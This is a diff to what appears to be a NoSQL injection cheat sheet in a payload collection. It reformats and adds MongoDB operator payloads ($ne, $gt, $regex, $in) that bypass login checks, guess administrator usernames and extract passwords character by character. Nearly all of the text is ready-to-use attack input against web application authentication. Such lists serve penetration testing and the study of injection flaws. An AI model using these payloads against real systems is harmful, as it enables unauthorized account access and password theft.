@@ -11,9 +11,10 @@ in URL
 username[$ne]=toto&password[$ne]=toto
 
 in JSON
-{"username": {"$ne": null}, "password": {"$ne": null} }
-{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
-{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
 ```
 
 Extract length information
@@ -39,6 +40,13 @@ in JSON
 {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
 {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
 ```
+
+Extract data with "in"
+
+````json
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+```
+
 
 ## Blind NoSQL
 
